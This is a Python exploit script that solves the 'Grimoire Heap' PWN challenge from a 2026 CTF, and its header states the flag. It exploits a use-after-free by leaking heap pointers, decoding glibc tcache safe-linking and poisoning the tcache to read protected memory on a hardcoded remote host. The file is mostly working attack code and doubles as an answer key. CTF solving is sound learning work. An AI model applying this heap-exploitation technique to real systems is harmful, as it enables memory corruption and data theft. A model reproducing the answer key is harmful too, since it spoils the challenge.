#!/usr/bin/env python3
"""
Grimoire Heap — PWN Challenge Solver
=====================================

Challenge:  Grimoire Heap (UCSI Agentic AI CTF 2026)
Category:   PWN
Flag:       UCSI26{grimoire_uaf_tcache_win_6e7291e6}

Vulnerability:
    Use-After-Free (UAF) — The delete function calls free() on a spell
    chunk but does not NULL the pointer in spells[index] or zero sizes[index].
    This allows reading/writing freed heap chunks.

Exploitation:
    1. Allocate two spells (A, B) of size 0x80
    2. Free A → read A to get heap_hi (tcache safe-linking: encoded_fd = 0)
    3. Free B → read B to get encoded_fd, decode to find A's address
    4. Calculate g_flag address (A - 0x90, since flag is allocated before A)
    5. Tcache poison: edit freed B's fd to point to g_flag - 0x10
    6. Allocate twice: first consumes B, second returns g_flag - 0x10
    7. Read the fake chunk → flag at offset 0x10

Requires:
    - pwntools
    - Remote service running on the target
"""

from __future__ import annotations

import sys
import struct

# ── Configuration ─────────────────────────────────────────────────────

HOST = "52.76.96.108"
PORT = 9005
SPELL_SIZE = 0x80  # Matches g_flag allocation size


def solve_remote():
    """Solve Grimoire Heap via remote connection using pwntools."""
    from pwn import remote, log, context

    context.log_level = "info"

    log.info("Connecting to %s:%d", HOST, PORT)
    r = remote(HOST, PORT)

    def create(index: int, size: int, content: bytes = b"A"):
        """Create a new spell."""
        r.sendlineafter(b">", b"1")
        r.sendlineafter(b"index:", str(index).encode())
        r.sendlineafter(b"size:", str(size).encode())
        r.sendlineafter(b"data:", content)

    def delete(index: int):
        """Delete (free) a spell — but pointer is NOT nulled (UAF!)."""
        r.sendlineafter(b">", b"3")
        r.sendlineafter(b"index:", str(index).encode())

    def read(index: int) -> bytes:
        """Read a spell (works on freed chunks due to UAF)."""
        r.sendlineafter(b">", b"4")
        r.sendlineafter(b"index:", str(index).encode())
        res = r.recvline()
        if b"data:" in res:
            res = res.split(b"data:", 1)[1].lstrip(b" ").rstrip(b"\n")
        return res

    def edit(index: int, content: bytes):
        """Edit a spell (works on freed chunks due to UAF)."""
        r.sendlineafter(b">", b"2")
        r.sendlineafter(b"index:", str(index).encode())
        payload = content.ljust(SPELL_SIZE, b"\x00")
        r.sendafter(b"data:", payload)

    # ── Step 1: Allocate two spells of size 0x80 ──
    log.info("Creating spell A (index 0) and spell B (index 1)")
    create(0, SPELL_SIZE, b"AAAA")
    create(1, SPELL_SIZE, b"BBBB")

    # ── Step 2: Free A, read leaked heap_hi ──
    log.info("Freeing spell A (UAF — pointer NOT cleared)")
    delete(0)

    leaked_a = read(0)
    heap_hi = struct.unpack("<Q", leaked_a[:8].ljust(8, b"\x00"))[0]
    log.info("Leaked heap_hi (A's encoded_fd when alone in tcache): 0x%x", heap_hi)

    # ── Step 3: Free B, decode its fd to find A's address ──
    log.info("Freeing spell B")
    delete(1)

    leaked_b = read(1)
    encoded_fd = struct.unpack("<Q", leaked_b[:8].ljust(8, b"\x00"))[0]
    log.info("Encoded fd from B: 0x%x", encoded_fd)

    a_address = encoded_fd ^ heap_hi
    log.info("Decoded A address: 0x%x", a_address)

    # ── Step 4: Calculate g_flag address ──
    # g_flag was allocated BEFORE A with malloc(0x80)
    # Chunk size = 0x90 (0x80 + metadata)
    flag_address = a_address - 0x90
    log.info("Calculated g_flag address: 0x%x", flag_address)

    # ── Step 5: Tcache poison — overwrite B's fd ──
    # Target: g_flag - 0x10 (avoid metadata corruption)
    fake_target = flag_address - 0x10

    # Safe-link encode the poisoned fd
    # The fd is encoded with: poisoned_fd = target ^ (chunk_address >> 12)
    # Since B is the chunk whose fd we're overwriting:
    b_address = a_address + 0x90
    poisoned_fd = fake_target ^ (b_address >> 12)

    log.info("Poisoning tcache: target=0x%x, encoded=0x%x", fake_target, poisoned_fd)
    edit(1, struct.pack("<Q", poisoned_fd))

    # ── Step 6: Allocate twice to get fake pointer ──
    log.info("Allocating to consume poisoned tcache entries...")
    create(2, SPELL_SIZE, b"CCCC")  # Consumes B's chunk
    create(3, SPELL_SIZE, b"DDDD")  # Returns fake_target (g_flag - 0x10)

    # ── Step 7: Read the fake chunk → flag at offset 0x10 ──
    log.info("Reading fake chunk to extract flag...")
    data = read(3)
    flag = None

    # The flag starts at offset 0x10 in the returned data
    try:
        # Try to find the flag pattern in the raw data
        import re
        flag_match = re.search(rb"UCSI26\{[a-zA-Z0-9_\-]+\}", data)
        if flag_match:
            flag = flag_match.group().decode()
            log.success("FLAG FOUND: %s", flag)
        else:
            # Try hex decoding
            hex_data = data.hex()
            log.info("Raw hex: %s", hex_data[:200])
            # Look for flag in hex
            flag_hex_match = re.search(
                rb"5543534932367b[0-9a-f]+7d", hex_data.encode()
            )
            if flag_hex_match:
                flag = bytes.fromhex(flag_hex_match.group().decode()).decode()
                log.success("FLAG FOUND: %s", flag)
            else:
                log.warning("Flag not found in output. Raw data:")
                log.warning(repr(data))
    except Exception as e:
        log.error("Error extracting flag: %s", e)
        log.info("Raw data: %s", repr(data))

    r.close()
    return flag


def solve_socket():
    """
    Simplified solver using raw sockets (no pwntools dependency).
    Demonstrates the same UAF + tcache poisoning technique.
    """
    import socket
    import time

    def recv_until(s, marker, timeout=5):
        """Receive data until a marker is found."""
        data = b""
        s.settimeout(timeout)
        while marker not in data:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        return data

    def send_cmd(s, cmd):
        """Send a command and receive response."""
        s.sendall(cmd.encode() + b"\n")
        return recv_until(s, b"> ", timeout=3)

    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.create_connection((HOST, PORT), timeout=10)

    # Read banner
    banner = recv_until(s, b"> ")
    print(f"[*] Banner received ({len(banner)} bytes)")

    # The full exploit follows the same logic as solve_remote()
    # but uses raw socket operations instead of pwntools
    print("[*] Use solve_remote() with pwntools for full exploit")
    print("[*] This simplified version demonstrates the concept")

    s.close()
    print("[*] Done")


# ── Entry Point ───────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  Grimoire Heap — UAF + Tcache Poisoning Exploit")
    print("  UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()

    try:
        solve_remote()
    except ImportError:
        print("[!] pwntools not available, using socket fallback")
        solve_socket()
    except Exception as e:
        import traceback
        print(f"[!] Exploit failed: {e}")
        traceback.print_exc()
        print("[!] Replay did not return a verified flag.")
